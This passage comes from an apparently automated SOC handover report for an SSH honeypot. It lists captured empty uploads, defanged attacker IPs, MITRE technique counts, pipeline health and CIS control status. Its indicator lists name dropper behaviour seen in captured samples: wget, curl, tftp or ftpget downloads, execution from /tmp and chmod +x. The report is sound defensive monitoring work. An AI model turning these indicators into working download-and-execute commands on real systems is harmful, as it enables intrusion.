| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `68.51.134[.]27` | US | Comcast Cable Communications, Inc. | **100** ⚠️ | 0 |
| `134.209.229[.]23` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 8 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `92.204.138[.]44` | US | Host Europe GmbH | **100** ⚠️ | 14 |
| `136.116.129[.]132` | US | Google LLC | **100** ⚠️ | 3 |
| `87.236.176[.]95` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `103.187.147[.]0` | SG | Cloud Host Pte Ltd | **100** ⚠️ | 18 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 62 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 52 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 3 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 117 cases |
| Tool 34  | Credential Extractor        | ✅ 58 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (9.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 18 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 52 priority case(s) shown individually · 18 recon entry/entries in table (9 group(s) consolidating 45 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-25T18:45:10Z_
